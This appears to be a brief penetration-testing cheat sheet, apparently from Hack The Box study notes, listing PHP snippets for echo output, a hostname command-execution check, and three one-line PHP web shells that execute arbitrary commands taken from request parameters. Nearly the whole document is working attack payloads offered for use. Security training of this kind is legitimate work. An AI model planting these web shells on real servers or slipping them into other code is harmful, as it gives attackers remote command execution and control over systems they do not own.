# PHP ECHO
```
<?php echo "Hello HTB";?>
```




# Basic PHP Command Execution
```
<?php system('hostname'); ?>
```




# Basic PHP Web Shell
```
<?php system($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET["c"]);?>
<?PHP system($_GET['cmd']);?>
```
